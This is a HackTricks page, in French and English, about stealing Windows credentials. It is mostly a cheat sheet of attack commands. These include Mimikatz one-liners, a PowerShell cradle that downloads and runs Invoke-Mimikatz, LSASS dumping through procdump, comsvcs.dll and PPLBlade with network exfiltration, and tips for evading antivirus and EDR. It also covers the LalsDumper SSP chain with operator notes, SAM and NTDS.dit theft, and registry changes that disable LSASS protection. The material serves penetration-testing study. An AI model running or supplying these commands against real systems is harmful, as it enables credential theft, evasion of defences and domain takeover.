# Vol des Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trouvez d'autres choses que Mimikatz peut faire sur** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains credentials.**

## Credentials avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des passwords et des hashes** sur la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contourner l'AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **dump the lsass process**, **download the dump** et **extract** les **credentials localement** depuis le dump.

Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque**: Certains **AV** peuvent **détecter** comme **malveillante** l'utilisation de **procdump.exe to dump lsass.exe**, cela vient du fait qu'ils **détectent** la chaîne **"procdump.exe" and "lsass.exe"**. Il est donc **plus furtif** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu de** du **nom lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
Les deux premiers arguments sont sans importance, mais le troisième est divisé en trois composants. L'ID du processus à dumper constitue le premier composant, l'emplacement du fichier de dump représente le deuxième, et le troisième composant est strictement le mot **full**. Aucune autre option n'existe.\
Après analyse de ces trois composants, la DLL se charge de créer le fichier de dump et d'y transférer la mémoire du processus spécifié.\
L'utilisation de **comsvcs.dll** est réalisable pour dumper le processus lsass, supprimant ainsi le besoin d'uploader et d'exécuter procdump. Cette méthode est décrite en détail à [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Vidage de lsass avec le Gestionnaire des tâches**

1. Cliquez avec le bouton droit sur la barre des tâches et sélectionnez Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processus
4. Cliquez avec le bouton droit sur le processus "Local Security Authority Process" et sélectionnez "Créer un fichier de vidage".

### Vidage de lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Vidage de lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil Protected Process Dumper qui permet d'obfusquer les dumps mémoire et de les transférer vers des postes distants sans les écrire sur le disque.

**Fonctionnalités clés**:

1. Contourner la protection PPL
2. Obfusquer les fichiers de dump mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
3. Téléverser les dumps mémoire via les méthodes RAW et SMB sans les écrire sur le disque (dump sans fichier)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon inclut un dumper en trois étapes nommé **LalsDumper** qui n'appelle jamais `MiniDumpWriteDump`, donc les hooks EDR sur cette API ne se déclenchent jamais :

1. **Stage 1 loader (`lals.exe`)** – recherche dans `fdp.dll` un placeholder constitué de 32 caractères `d` en minuscules, l'écrase avec le chemin absolu vers `rtu.txt`, enregistre la DLL patchée sous `nfdp.dll`, et appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante comme un nouveau Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quand LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, XOR chaque octet avec `0x20`, et mappe le blob décodé en mémoire avant de transférer l'exécution.
3. **Stage 3 dumper** – le payload mappé réimplémente la logique de MiniDump en utilisant des syscalls directs résolus à partir de noms d'API hashés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Une exportation dédiée nommée `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump LSASS compressé dans le fichier, puis ferme le handle pour permettre l'exfiltration ultérieure.

Operator notes:

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll` et `rtu.txt` dans le même répertoire. Stage 1 réécrit le placeholder codé en dur avec le chemin absolu vers `rtu.txt`, donc les séparer brise la chaîne.
* L'enregistrement se fait en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez initialiser cette valeur vous-même pour forcer LSASS à recharger le SSP à chaque démarrage.
* Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez-les localement, puis passez-les à Mimikatz/Volatility pour l'extraction des identifiants.
* L'exécution de `lals.exe` nécessite des droits admin/SeTcb pour que `AddSecurityPackageA` réussisse ; une fois l'appel retourné, LSASS charge de manière transparente le SSP malveillant et exécute Stage 2.
* La suppression de la DLL du disque ne l'éjecte pas de LSASS. Supprimez l'entrée de registre et redémarrez LSASS (reboot) ou laissez-la pour une persistance à long terme.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump du NTDS.dit depuis le DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe de NTDS.dit depuis le DC cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte dans NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.

### Depuis le Registre

La façon la plus simple de récupérer ces fichiers est d'en obtenir une copie depuis le Registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez copier des fichiers protégés en utilisant ce service. Vous devez être Administrateur.

#### Using vssadmin

Le binaire vssadmin n'est disponible que dans les versions Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Ceci est un exemple de **how to copy the SAM file** (le disque dur utilisé est "C:" et il est sauvegardé dans C:\users\Public), mais vous pouvez utiliser ceci pour copier n'importe quel fichier protégé:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code extrait du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Le fichier **NTDS.dit** est connu comme le cœur de **Active Directory**, contenant des données cruciales sur les objets utilisateur, les groupes et leurs appartenances. C'est là que les **password hashes** des utilisateurs du domaine sont stockés. Ce fichier est une base de données **Extensible Storage Engine (ESE)** et réside à **_%SystemRoom%/NTDS/ntds.dit_**.

Dans cette base de données, trois tables principales sont maintenues :

- **Data Table** : cette table est chargée de stocker les détails des objets comme les utilisateurs et les groupes.
- **Link Table** : elle garde la trace des relations, comme les appartenances aux groupes.
- **SD Table** : les descripteurs de sécurité (**Security descriptors**) pour chaque objet sont stockés ici, assurant la sécurité et le contrôle d'accès des objets enregistrés.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ensuite, une **partie** du fichier **NTDS.dit** peut être située **dans la mémoire de `lsass`** (vous pouvez trouver les données les plus récemment accédées, probablement en raison de l'amélioration des performances via un **cache**).

#### Déchiffrement des hashes dans NTDS.dit

Le hash est chiffré 3 fois :

1. Décrypter Password Encryption Key (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Décrypter le **hash** en utilisant **PEK** et **RC4**.
3. Décrypter le **hash** en utilisant **DES**.

**PEK** a la **même valeur** sur **chaque domain controller**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du fichier **SYSTEM** du **domain controller** (il est différent entre les domain controllers). C'est pourquoi, pour obtenir les **credentials** depuis le fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez aussi utiliser l'astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du **SYSTEM file** (là encore, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) astuce).

### **Extraction des hashes depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** en utilisant un utilisateur domain admin valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les **gros fichiers NTDS.dit** il est recommandé de l'extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez aussi utiliser le **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine depuis NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'ensemble des objets et de leurs attributs pour permettre une extraction d'informations plus approfondie lorsque le fichier NTDS.dit brut a déjà été récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Le `SYSTEM` hive est optionnel mais permet le déchiffrement des secrets (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). En plus d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, UAC flags, horodatage du dernier logon et du changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et appartenances récursives, arbre des unités d'organisation et appartenance, trusted domains avec le type de trust, direction et attributs...

## Lazagne

Téléchargez le binaire depuis [here](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des credentials depuis plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire des credentials depuis SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des credentials depuis la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Permet d'extraire des credentials du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis : [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) et **exécutez-le** : les mots de passe seront extraits.

## Exploitation des sessions RDP inactives et affaiblissement des contrôles de sécurité

Ink Dragon’s FinalDraft RAT inclut un tasker `DumpRDPHistory` dont les techniques sont utiles pour tout red-teamer :

### Collecte de télémétrie de type DumpRDPHistory

* **Outbound RDP targets** – analyser chaque ruche utilisateur à `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé contient le nom du serveur, `UsernameHint`, et la date de dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – interroger le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les Event IDs **21** (connexion réussie) et **25** (déconnexion) afin de cartographier qui a administré la machine :

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Une fois que vous savez quel Domain Admin se connecte régulièrement, procédez au dump de LSASS (avec LalsDumper/Mimikatz) tant que sa session **déconnectée** est encore présente. CredSSP + NTLM fallback laisse leur verifier et leurs tokens dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou établir une persistance sur les domain controllers.

### Altérations du registre ciblées par FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Le paramètre `DisableRestrictedAdmin=1` force la réutilisation complète des identifiants/tickets lors de RDP, permettant des pivots de type pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des tokens UAC, de sorte que les administrateurs locaux obtiennent des tokens sans restriction sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l'administrateur DSRM de se connecter alors que le DC est en ligne, offrant aux attaquants un autre compte intégré à privilèges élevés.
* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l'accès mémoire trivial pour des dumpers tels que LalsDumper.

## Références

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
